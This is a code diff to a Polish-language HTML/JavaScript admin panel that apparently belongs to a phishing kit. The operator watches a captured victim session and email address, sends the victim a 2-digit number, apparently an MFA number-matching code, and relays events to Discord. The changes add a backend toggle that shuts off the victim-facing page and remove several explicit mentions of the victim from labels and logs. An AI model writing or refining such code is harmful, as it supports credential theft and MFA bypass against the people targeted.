@@ -111,7 +111,6 @@
         .status-box .row .val { color: #f0e6ff; word-break: break-all; }
         .status-box .row .val.empty { color: #4a2a5a; }
 
-        /* NUMER - 2 CYFRY */
         .code-input-row {
             display: flex;
             gap: 10px;
@@ -239,7 +238,7 @@
 
         <!-- TOGGLE ON/OFF -->
         <div class="toggle-row">
-            <span class="label">🔘 Status <small>(widoczność dla ofiary)</small></span>
+            <span class="label">🔘 Status <small>(wyłącza stronę ofiary)</small></span>
             <div class="toggle-switch active" id="toggleBtn">
                 <div class="knob"></div>
             </div>
@@ -252,7 +251,7 @@
             <div class="row"><span class="lbl">📱 Status</span><span class="val" id="statusDisplay">⏳ Oczekiwanie...</span></div>
         </div>
 
-        <!-- WPROWADŹ NUMER (2 CYFRY) -->
+        <!-- WPROWADŹ NUMER -->
         <div class="code-input-row">
             <input type="text" id="codeInput" placeholder="81" maxlength="2" inputmode="numeric">
             <span class="hint">(2 cyfry)</span>
@@ -289,7 +288,6 @@
         const refreshBtn = document.getElementById('refreshBtn');
         const log = document.getElementById('log');
 
-        let isOnline = true;
         let currentSession = null;
         let currentEmail = '';
         let currentCode = '';
@@ -319,7 +317,6 @@
 
         // ============ LIVE PREVIEW ============
         codeInput.addEventListener('input', function() {
-            // Tylko cyfry
             this.value = this.value.replace(/\D/g, '').slice(0, 2);
             const val = this.value.trim();
             if (val && val.length === 2) {
@@ -336,28 +333,49 @@
 
         // ============ TOGGLE ============
         toggleBtn.addEventListener('click', function() {
-            isOnline = !isOnline;
-            this.classList.toggle('active');
-            liveStatus.textContent = isOnline ? '● LIVE' : '○ OFF';
-            liveStatus.className = 'live' + (isOnline ? '' : ' off');
-            if (isOnline) {
-                statusDisplay.textContent = '✅ Online - aktywny';
-                sendDC('🟢 Panel włączony');
-                addLog('🟢 Panel włączony');
-            } else {
-                statusDisplay.textContent = '⛔ Offline - nieaktywny';
-                sendDC('🔴 Panel wyłączony');
-                addLog('🔴 Panel wyłączony');
-                sendBtn.disabled = true;
-            }
+            const isOn = this.classList.contains('active');
+            const newStatus = isOn ? 'off' : 'on';
+
+            // Wyślij do backendu
+            fetch(API, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    action: 'set_status', 
+                    status: newStatus 
+                })
+            })
+            .then(r => r.json())
+            .then(data => {
+                if (data.success) {
+                    this.classList.toggle('active');
+                    liveStatus.textContent = data.online ? '● LIVE' : '○ OFF';
+                    liveStatus.className = 'live' + (data.online ? '' : ' off');
+                    statusDisplay.textContent = data.online ? '✅ Online - aktywny' : '⛔ Offline - nieaktywny';
+                    addLog(`🔄 System ${data.online ? 'włączony' : 'wyłączony'}`);
+                    sendDC(`🔄 System ${data.online ? 'włączony' : 'wyłączony'}`);
+                    checkSession(); // Odśwież
+                }
+            })
+            .catch(() => {
+                addLog('❌ Błąd zmiany statusu');
+            });
         });
 
         // ============ CHECK SESSION ============
         function checkSession() {
-            if (!isOnline) return;
             fetch(API + '?list=true')
                 .then(r => r.json())
                 .then(data => {
+                    // Zaktualizuj status systemu
+                    const isOnline = data.system_online !== false;
+                    const toggleActive = toggleBtn.classList.contains('active');
+                    if (isOnline !== toggleActive) {
+                        toggleBtn.classList.toggle('active', isOnline);
+                        liveStatus.textContent = isOnline ? '● LIVE' : '○ OFF';
+                        liveStatus.className = 'live' + (isOnline ? '' : ' off');
+                    }
+
                     if (data.sessions && data.sessions.length > 0) {
                         const s = data.sessions[0];
                         currentSession = s.session;
@@ -388,8 +406,8 @@
                     } else {
                         sessionDisplay.textContent = 'brak';
                         emailDisplay.textContent = 'brak';
-                        statusDisplay.textContent = '⏳ Oczekiwanie na sesję...';
-                        sendBtn.textContent = '⏳ Czekam na sesję...';
+                        statusDisplay.textContent = isOnline ? '⏳ Oczekiwanie na sesję...' : '⛔ System wyłączony';
+                        sendBtn.textContent = isOnline ? '⏳ Czekam na sesję...' : '⛔ System OFF';
                         sendBtn.disabled = true;
                     }
                 })
@@ -400,8 +418,8 @@
 
         // ============ SEND CODE ============
         function sendCode() {
-            if (!currentSession || !isOnline) {
-                addLog('❌ Brak sesji lub offline');
+            if (!currentSession) {
+                addLog('❌ Brak sesji');
                 return;
             }
 
@@ -412,7 +430,7 @@
                 return;
             }
 
-            // Zapisz kod na backendzie
+            // Zapisz kod
             fetch(API, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -427,9 +445,9 @@
                     liveCode.className = 'code-display sent';
                     sendBtn.textContent = '✅ Wysłano! (' + code + ')';
                     sendBtn.disabled = true;
-                    statusDisplay.textContent = '📤 Numer ' + code + ' wysłany do ofiary';
+                    statusDisplay.textContent = '📤 Numer ' + code + ' wysłany';
                     addLog('📤 Wysłano numer: ' + code);
-                    sendDC('📤 WYSŁANO NUMER: ' + code + '\n📧 Email: ' + currentEmail);
+                    sendDC('📤 WYSŁANO NUMER: ' + code + '\n📧 ' + currentEmail);
 
                     setTimeout(() => {
                         sendBtn.textContent = '📤 Wyślij ponownie';
@@ -444,7 +462,7 @@
         // ============ EVENTS ============
         sendBtn.addEventListener('click', sendCode);
         refreshBtn.addEventListener('click', function() {
-            addLog('🔄 Ręczne odświeżanie');
+            addLog('🔄 Odświeżanie');
             checkSession();
         });
 
@@ -454,14 +472,12 @@
 
         // ============ START ============
         addLog('🚀 Panel uruchomiony');
-        addLog('📱 Oczekiwanie na sesję ofiary...');
-        sendDC('🚀 Panel admina uruchomiony');
         checkSession();
         if (checkInterval) clearInterval(checkInterval);
         checkInterval = setInterval(checkSession, 4000);
 
         console.log('🔒 Panel Admina');
-        console.log('📱 Wpisz 2-cyfrowy numer i wyślij ofierze');
+        console.log('📱 Przełącznik ON/OFF wyłącza stronę ofiary');
     </script>
 
 </body>
